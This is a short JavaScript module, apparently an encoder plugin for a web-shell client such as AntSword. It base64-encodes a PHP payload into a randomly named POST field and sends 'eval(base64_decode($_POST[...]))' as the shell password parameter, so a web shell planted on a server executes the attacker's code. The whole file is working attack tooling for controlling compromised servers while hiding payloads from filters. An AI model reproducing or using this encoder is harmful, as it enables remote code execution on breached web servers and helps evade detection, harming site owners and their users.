// 
// php::base64 编码模块
// 
'use strict';

module.exports = (pwd, data) => {
  const randomID = `_0x${Math.random().toString(16).substr(2)}`;
  data[randomID] = new Buffer(data['_']).toString('base64');
  data[pwd] = `eval(base64_decode($_POST[${randomID}]));`;
  delete data['_'];
  return data;
}